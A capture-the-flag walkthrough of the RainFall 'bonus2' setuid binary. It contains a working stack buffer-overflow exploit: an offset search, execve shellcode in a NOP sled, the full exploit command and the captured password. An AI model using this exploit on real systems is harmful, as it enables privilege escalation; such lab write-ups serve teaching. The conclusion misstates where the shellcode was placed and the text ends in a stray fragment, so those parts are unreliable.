# Bonus2 Walkthrough

## Who am I?

```bash
bonus2@RainFall:~$ id
uid=2012(bonus2) gid=2012(bonus2) groups=2012(bonus2),100(users)
```

## Where am I?

```bash
bonus2@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 bonus2
# note: the `s` bits indicate setuid/setgid, the binary runs with the owner's privileges (here `bonus3`) when executed by another user (here `bonus2`).
```

---

## Discovery, behavior test

```bash
bonus2@RainFall:~$ ./bonus2
bonus2@RainFall:~$

bonus2@RainFall:~$ ./bonus2 hello
bonus2@RainFall:~$

bonus2@RainFall:~$ ./bonus2 hello world
Hello hello
bonus2@RainFall:~$

bonus2@RainFall:~$ LANG=fi ./bonus2 hello world
Hyvää päivää hello
bonus2@RainFall:~$

bonus2@RainFall:~$ LANG=nl ./bonus2 hello world
Goedemiddag! hello
bonus2@RainFall:~$
```

**Observation**: The program requires two arguments but only displays the first one after the greeting. The greeting changes based on the `LANG` environment variable.

---

## Function analysis

```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int language = 0;

void greetuser(char *username)
{
    char greeting[72];
    
    if (language == 1) {
        strcpy(greeting, "Hyvää päivää ");
    }
    else if (language == 2) {
        strcpy(greeting, "Goedemiddag! ");
    }
    else {
        strcpy(greeting, "Hello ");
    }
    
    strcat(greeting, username);
    puts(greeting);
}

int main(int argc, char **argv)
{
    char buffer1[40];
    char buffer2[32];
    char *lang;
    
    if (argc != 3) {
        return 1;
    }
    
    memset(buffer1, 0, 40);
    memset(buffer2, 0, 32);
    
    strncpy(buffer1, argv[1], 40);
    strncpy(buffer2, argv[2], 32);
    
    lang = getenv("LANG");
    if (lang != NULL) {
        if (memcmp(lang, "fi", 2) == 0) {
            language = 1;
        }
        else if (memcmp(lang, "nl", 2) == 0) {
            language = 2;
        }
    }
    
    strcat(buffer1, buffer2);
    greetuser(buffer1);
    
    return 0;
}
```

### Vulnerability Analysis

* **In `main()`**:
  * `strncpy(buffer1, argv[1], 40)`: Copies up to 40 bytes (may not be null-terminated if argv[1] is exactly 40 bytes)
  * `strncpy(buffer2, argv[2], 32)`: Copies up to 32 bytes (same issue)
  * `strcat(buffer1, buffer2)`: **CRITICAL** - Concatenates buffer2 to buffer1 without checking total length
  * **Issue**: If buffer1 is filled with 40 bytes (no null byte) and buffer2 with 32 bytes, we write 72 bytes into a 40-byte buffer!

* **In `greetuser()`**:
  * `greeting[72]`: 72-byte buffer
  * `strcat(greeting, username)`: **CRITICAL** - Concatenates without bounds checking
  * **Issue**: Greeting prefixes vary in length:
    - "Hello " = 6 bytes
    - "Hyvää päivää " = 13 bytes
    - "Goedemiddag! " = 13 bytes
  * If username is 72 bytes and prefix is 13 bytes, we write 85 bytes into a 72-byte buffer, overflowing into saved EBP and return address!

### Stack Layout

```
Low addresses
    |
    v
[greeting - 72 bytes] [saved ebp - 4 bytes] [return address - 4 bytes]
    ^
    |
High addresses
```

**Conclusion**: By controlling `LANG` and providing carefully crafted arguments, we can overflow the `greeting` buffer and overwrite the return address.

---

## Build the exploit

### 1) Determine EIP overwrite offset

Using a cyclic pattern to find the exact offset where we overwrite EIP:

```bash
# Generate pattern of 200 bytes
pattern: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

# Split at 40 bytes for argv[1] and argv[2]
argv[1]: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A
argv[2]: b3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

bonus2@RainFall:~$ LANG=fi ./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A b3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Hyvää päivää Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3
Segmentation fault (core dumped)
```

Using `msf-pattern_offset`:
```bash
EIP: 0x63413962
msf-pattern_offset -q 0x63413962
[*] Exact match at offset 58
```

**Note**: The offset of 58 is from the start of the concatenated string (argv[1] + argv[2]). Since we control argv[1] (40 bytes) and argv[2] (32 bytes), the offset in argv[2] is: `58 - 40 = 18 bytes`.

### 2) Choose shellcode and place it in environment

We'll use a classic execve("/bin//sh") shellcode (28 bytes):

**Shellcode**: [https://shell-storm.org/shellcode/files/shellcode-811.html](https://shell-storm.org/shellcode/files/shellcode-811.html)
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

Export it in an environment variable with a large NOP sled:

```bash
bonus2@RainFall:~$ export SHELLCODE=$(python -c 'print"\x90" * 120 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```

### 3) Find the address of the shellcode

Create a helper program to find the environment variable address:

```c
// /tmp/shellcode.c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    printf("%p\n", getenv("SHELLCODE"));
    return 0;
}
```

Compile and run:
```bash
bonus2@RainFall:~$ cc /tmp/shellcode.c -o /tmp/shellcode
bonus2@RainFall:~$ LANG=fi /tmp/shellcode
0xbffff88f
```

**Shellcode address**: `0xbffff88f`

We can aim for an address in the middle of the NOP sled to increase reliability. Let's calculate the address 60 bytes into the NOP sled:

```python
>>> hex(0xbffff88f + 60)
'0xbffff8cb'
```

**Target address**: `0xbffff8cb` (middle of the 120-byte NOP sled)

### 4) Build the exploit payload

We need:
* **argv[1]**: 40 bytes of NOPs (simpler than embedding shellcode here)
* **argv[2]**: Padding (18 bytes) + return address (4 bytes)

```bash
argv[1] = "\x90" * 40
argv[2] = "a" * 18 + "\xcb\xf8\xff\xbf"
```

### 5) Execute the exploit

```bash
bonus2@RainFall:~$ LANG=fi ./bonus2 $(python -c 'print"\x90" * 40') $(python -c 'print"a" * 18 + "\xcb\xf8\xff\xbf"')
Hyvää päivää ����������������������������������������aaaaaaaaaaaaaaaaaa����
$ id
uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$ 

---

## Files in this repository

* `flag.txt`: file containing the retrieved flag
* `source/`: contains `ghidra/` (raw Ghidra decompilation) and `clean/` (cleaned C source)

---

## Conclusion

This binary is exploitable through a buffer overflow in the `greetuser()` function. By using the Finnish (`LANG=fi`) language setting, the greeting prefix is long enough to allow an overflow when combined with the concatenated arguments. We placed shellcode in argv[1], calculated the precise offset to overwrite the return address (18 bytes into argv[2]), and redirected execution to our shellcode to spawn a shell with bonus3 privileges.\xcb\xf8\xff\xbf'
```
